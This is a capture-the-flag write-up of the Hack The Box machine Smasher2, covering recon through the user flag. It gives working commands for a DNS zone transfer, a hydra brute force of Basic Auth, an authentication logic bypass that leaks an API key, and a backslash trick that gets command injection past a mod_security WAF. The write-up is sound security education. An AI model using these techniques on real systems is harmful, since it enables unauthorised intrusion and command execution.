## Overview

Smasher2 is an insane-difficulty Linux box centred on exploitation rather than enumeration. A zone transfer exposes a session-manager web app whose source (gated by a weak Basic Auth password) reveals both an authentication logic bug and a command-execution API. Abusing the bug leaks the API key, and a WAF in front of the API is bypassed to land a shell as `dzonerzy`. This post covers recon through the user flag.

DNS zone-transfer and source-disclosure enumeration feed a reversed C-module auth logic bug and a backslash mod_security WAF bypass for command injection; custom exploitation with a contrived one-char trick.

## Recon

| Port | Service |
|------|---------|
| 22 | OpenSSH 7.6p1 (Ubuntu) |
| 53 | ISC BIND 9.11 (DNS, TCP + UDP) |
| 80 | Apache 2.4.29 (403 Forbidden on `/`) |

```bash
nmap -sC -sV -p- 10.129.7.147
```

Only three services, and the web root returns 403. DNS on TCP almost always means try a zone transfer.

## Enumeration

A zone transfer against the guessed domain `smasher2.htb` succeeds and reveals the real vhosts:

```bash
dig axfr @10.129.7.147 smasher2.htb
# -> smasher2.htb, wonderfulsessionmanager.smasher2.htb, root.smasher2.htb
```

Add them to `/etc/hosts`. `wonderfulsessionmanager.smasher2.htb` serves the **DZONERZY Session Manager (DSM)**. A short directory scan finds `/backup` behind HTTP Basic Auth:

```bash
# hint: the password starts with 'c' -> filter the wordlist to cut brute time
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.129.7.147 http-get /backup
# [80][http-get] login: admin   password: clarabibi
```

With `admin:clarabibi`, `/backup` exposes the app source — a Flask app `auth.py` and a compiled C extension `ses.so`:

```bash
curl -s -u admin:clarabibi http://10.129.7.147/backup/auth.py -o auth.py
curl -s -u admin:clarabibi http://10.129.7.147/backup/ses.so  -o ses.so
```

## Foothold

Reading `auth.py`, two things stand out. First, the API key is `HMAC-SHA256("HMACSecureKey123!", base64("user:pass"))` over hardcoded admin creds, and on a **successful** `/auth` it is returned in the response. Second, `/api/<key>/job` passes its `schedule` field straight into `subprocess.check_output(['bash','-c', ...])` — command execution for anyone with the key.

Reversing `ses.so` reveals the logic bug: the password-check fetches list index `0` (the username) twice instead of index `1`, so the submitted **password is compared against the stored username**. The account is `Administrator`, so `Administrator:Administrator` authenticates and the response leaks the API key:

```bash
# seed a session first, then auth with the logic bug
curl -s -c dsm.cj -H "Host: wonderfulsessionmanager.smasher2.htb" http://10.129.7.147/ -o /dev/null
curl -s -b dsm.cj -H "Host: wonderfulsessionmanager.smasher2.htb" -H "Content-Type: application/json" \
  -X POST http://10.129.7.147/auth \
  --data '{"action":"auth","data":{"username":"Administrator","password":"Administrator"}}'
# {"authenticated":true,"result":{"endpoint":"/api/<api_key>/job","key":"<redacted>", ...}}
```

The API endpoint is guarded by a mod_security WAF that 403s on recognizable command words. It matches the literal word, so inserting a backslash mid-word (`i\d` — bash collapses it to `id`) slips straight past:

```bash
curl -s -b dsm.cj -H "Host: wonderfulsessionmanager.smasher2.htb" -H "Content-Type: application/json" \
  -X POST http://10.129.7.147/api/<redacted>/job --data '{"schedule":"i\\d"}'
# {"result":"uid=1000(dzonerzy) gid=1000(dzonerzy) ...","success":true}
```

That's execution as `dzonerzy`.

## User flag

```bash
curl -s -b dsm.cj -H "Host: wonderfulsessionmanager.smasher2.htb" -H "Content-Type: application/json" \
  -X POST http://10.129.7.147/api/<redacted>/job --data '{"schedule":"c\\at /home/dzonerzy/user.txt"}'
# HTB{...}
```

Execution as `dzonerzy` achieved — the source disclosure handed over both an auth bypass and a command-execution path, and a one-character WAF trick turned that into a shell.

Privilege escalation is left as an exercise — this post stops at user.
